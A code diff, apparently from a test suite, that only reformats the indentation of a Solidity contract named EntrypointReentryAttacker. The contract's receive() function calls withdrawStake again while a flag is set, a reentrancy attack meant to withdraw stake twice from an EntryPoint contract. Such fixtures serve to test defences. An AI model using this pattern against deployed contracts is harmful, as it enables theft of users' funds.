@@ -1,33 +1,33 @@
 import "../base/VerifyingPaymaster.sol";
 import "../iface/IEntryPoint.sol";
 pragma solidity ^0.8.12;
-  
+
 contract EntrypointReentryAttacker {
     IEntryPoint public victim;
-    
+
     constructor(address payable _victim) {
-      victim = IEntryPoint(_victim);
+        victim = IEntryPoint(_victim);
     }
 
     bool public recusive = false;
 
-    receive() external payable { 
-      if (recusive) {
-        recusive = false;
-        victim.withdrawStake(payable(this));
-      }
+    receive() external payable {
+        if (recusive) {
+            recusive = false;
+            victim.withdrawStake(payable(this));
+        }
     }
 
     function deposit() external payable {
-      victim.addStake{value: msg.value}(10);
+        victim.addStake{value: msg.value}(10);
     }
+
     function unlockStake() external {
-      victim.unlockStake();
+        victim.unlockStake();
     }
-    
+
     function attack() external {
-      recusive = true;
-      victim.withdrawStake(payable(this));
+        recusive = true;
+        victim.withdrawStake(payable(this));
     }
 }
-
